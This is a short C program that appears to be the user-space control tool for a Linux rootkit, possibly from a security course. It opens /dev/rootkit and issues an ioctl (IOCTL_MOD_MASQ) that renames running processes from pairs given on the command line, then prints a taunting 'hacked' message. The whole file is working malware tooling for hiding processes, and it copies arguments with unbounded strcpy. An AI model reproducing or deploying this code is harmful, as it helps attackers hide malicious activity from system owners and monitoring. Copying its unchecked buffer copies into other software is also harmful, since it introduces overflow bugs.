#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include "../rootkit.h"




int main(int argc, char *argv[]) {
    int fd;
    if(argc % 2 == 0 || argc == 1)
    {
        fprintf(stderr, "Your input argument should be [old name 1] [new name 1] [old name 2] [new name 2] ......");
        return 1;
    }

    int len = (argc-1) / 2;
    struct masq_proc_req req;
    struct masq_proc proc_list[len];
    req.len = len;


    for(int i=0;i<len;i++)
    {
        strcpy(proc_list[i].orig_name, argv[2*i+1]);
        strcpy(proc_list[i].new_name,  argv[2*i+2]);
    }
    req.list = proc_list;

    fd = open("/dev/rootkit", O_RDWR);

    ioctl(fd, IOCTL_MOD_MASQ, &req);
    printf("Hehe! Your command is hacked to myname.... WoW! Be careful bro!\n");

    close(fd);
    return 0;
}

